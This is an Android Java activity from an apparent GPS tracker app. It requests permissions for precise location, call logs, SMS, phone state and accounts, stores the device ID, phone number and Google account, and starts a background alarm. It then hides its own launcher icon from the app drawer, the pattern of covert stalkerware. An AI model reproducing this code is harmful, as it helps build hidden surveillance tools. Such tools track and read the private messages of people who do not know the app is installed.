package com.alcatrazstudios.apps.androidtracker.activities;

import android.Manifest;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.support.annotation.NonNull;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.view.WindowManager;

import com.alcatrazstudios.apps.androidtracker.R;
import com.alcatrazstudios.apps.androidtracker.application.GpsTrackerApplication;

import java.util.UUID;


public class GpsTrackerActivity extends AppCompatActivity {
    private static boolean allPermissions=false;
    private boolean firstTimeLoadingApp;
    private final String[] permissions=new String[]{
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.WAKE_LOCK,
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.GET_ACCOUNTS};
    private final int PERM_CLOSED=100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_gps_tracker);
        SharedPreferences sharedPreferences=GpsTrackerApplication.getSharedPreferences();
        firstTimeLoadingApp = sharedPreferences.getBoolean("firstTimeLoadingApp", true);
/*        if (firstTimeLoadingApp) {

            Intent intent=new Intent(this,PermissionsActivity.class);
            startActivityForResult(intent,PERM_CLOSED);
        }*/
        if (!firstTimeLoadingApp){
            SharedPreferences.Editor editor = sharedPreferences.edit();
            editor.clear();
            editor.apply();
        }
        Intent intent=new Intent(this,PermissionsActivity.class);
        startActivityForResult(intent,PERM_CLOSED);
    }

    private void getFirstTimeValues(){
        SharedPreferences sharedPreferences=GpsTrackerApplication.getSharedPreferences();
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putBoolean("firstTimeLoadingApp", false);
        editor.putString("appID",  UUID.randomUUID().toString());
        String deviceId = GpsTrackerApplication.getUniqueID();
        TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
        String phoneNo = telephonyManager.getLine1Number();
        String googleAcct=GpsTrackerApplication.getGoogleAccount();

        editor.putString("deviceId",deviceId);
        editor.putString("phoneNo",phoneNo);
        editor.putString("googleAcct",googleAcct);
        editor.apply();
    }

    private void turnOffActivity(){
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE);
        // remove the icon from App Drawer
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, GpsTrackerActivity.class);
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode==PERM_CLOSED){
            getFirstTimeValues();
            GpsTrackerApplication.startAlarmManager(this);
            turnOffActivity();
        }
        super.onActivityResult(requestCode, resultCode, data);
    }
}
